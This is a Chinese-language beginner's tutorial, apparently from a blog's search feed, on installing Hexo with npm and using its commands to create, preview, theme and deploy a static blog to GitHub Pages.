        <content type="html"><![CDATA[<h1 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h1><p>Hexo 是一个基于 node.js 快速、简洁且高效的博客框架。支持 Markdown 写作，可一键部署到 <a href="https://github.com/">GitHub</a>平台。Hexo 还有丰富的主题和插件可供定制和扩展，可以瞬间拥有个人专属的博客网站。</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><blockquote><p>本篇博客不提供安装教程（emmmm就是我太懒了），请自行搜索</p></blockquote><ul><li><p>node.js（不低于10.13，建议使用12.0及以上版本）</p><p>Hexo基于node.js</p></li><li><p>npm</p><p>node.js的包管理工具</p></li></ul><p>查看电脑是否安装了环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看node.js版本</span></span><br><span class="line">node <span class="literal">-v</span></span><br><span class="line"><span class="comment"># 查看npm版本</span></span><br><span class="line">npm <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p>有版本输出就代表环境安装好了</p><p>那我们就正式开始Hexo之路吧~</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure><p>-g 代表全局安装（不必太过纠结这个哈~熟悉前端和node的朋友可以直接<code>npm install hexo-cli</code>）</p><p>好啦！到这里，Hexo已经安装好啦 ~</p><h1 id="Hexo操作"><a href="#Hexo操作" class="headerlink" title="Hexo操作"></a>Hexo操作</h1><p>下面是Hexo的一些操作指南，助你快速入门Hexo</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>这里讲两种方式哈，效果都一样，随便选个就行</p><p><strong>方法一</strong></p><ol><li>新建一个文件夹</li><li>cmd切换到该路径，输入<code>hexo init</code></li></ol><p><strong>方法二</strong></p><p><code>hexo init [name]</code></p><p>name是文件夹名字，相当于省去了方法一的第一步</p><h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>经过上一步的初始化操作，你的Hexo博客已经搭建起来啦</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="comment"># 生成</span></span><br><span class="line">hexo s <span class="comment"># 本地启动服务</span></span><br></pre></td></tr></table></figure><p>这时候，终端会开启一个服务，一般是<a href="http://localhost:4000/">http://localhost:4000</a>，按住Ctrl单击就可以打开</p><p>这时候你就可以看到一个Hexo博客啦~</p><p><em>如果无法显示，可能是 4000 端口被占用了，可以使用如下命令指定端口</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -p 4444 <span class="comment"># 指定4444端口或者其他端口</span></span><br></pre></td></tr></table></figure><p>如果经常4000端口被占用，建议一劳永逸，直接修改配置文件<em>node_modules&#x2F;hexo-server&#x2F;index.js</em>，将默认端口改成4444或者其他端口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">config</span>.<span class="property">server</span> = <span class="title function_">assign</span>(&#123;</span><br><span class="line">  <span class="comment">//将默认端口改成4444</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">4444</span>,</span><br><span class="line">  <span class="attr">log</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ip</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">compress</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">header</span>: <span class="literal">true</span></span><br><span class="line">&#125;, hexo.<span class="property">config</span>.<span class="property">server</span>);</span><br></pre></td></tr></table></figure><p>如果你的github也配置好了，那么输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d <span class="comment"># 部署</span></span><br></pre></td></tr></table></figure><p>就可以把本地的博客部署到GitHub Pages上啦</p><h2 id="新建博客"><a href="#新建博客" class="headerlink" title="新建博客"></a>新建博客</h2><ol><li>新建一个文章</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br><span class="line"><span class="comment"># or 不使用简写</span></span><br><span class="line">hexo new <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br></pre></td></tr></table></figure><ol start="2"><li>打开博客目录下的&#x2F;source&#x2F;_posts就可以看到刚刚新建的md文件啦</li><li>编辑md文件，保存</li><li>生成并本地预览</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo s <span class="literal">-g</span> <span class="comment"># 组合命令，生成并本地预览</span></span><br><span class="line"><span class="comment"># or 分开输入两条命令</span></span><br><span class="line">hexo g<span class="comment"># 生成（缩写）</span></span><br><span class="line">hexo s<span class="comment"># 预览（缩写）</span></span><br><span class="line"><span class="comment"># or 分开并不使用简写</span></span><br><span class="line">hexo generate<span class="comment"># 生成</span></span><br><span class="line">hexo server <span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><h2 id="设置标头"><a href="#设置标头" class="headerlink" title="设置标头"></a>设置标头</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">我是文章名</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-08-13 09:22:18</span></span><br><span class="line"><span class="comment"># 标签</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line"><span class="comment"># 分类</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tutorial</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>在 _config.yml 开启资源文件夹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>开启之后，在 _posts 目录下会生成一个与文章同名的文件夹。把需要插入到文章中的图片放到该文件夹中，并在写文章时通过如下标签引用即可。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img &lt;图片名&gt; [图片标题] %&#125;</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>默认主题太丑了？那换个好看滴主题叭~~</p><p>直接去官网看看，找到喜欢的换就行，一般主题的开发者会写好怎么更换的哈~（emmm是我懒）</p><p>换好了之后，执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean<span class="comment"># 清除，避免更换失败</span></span><br><span class="line">hexo s <span class="literal">-g</span><span class="comment"># 生成，本地预览</span></span><br><span class="line"><span class="comment">## 预览没问题之后</span></span><br><span class="line">hexo d<span class="comment"># 部署</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
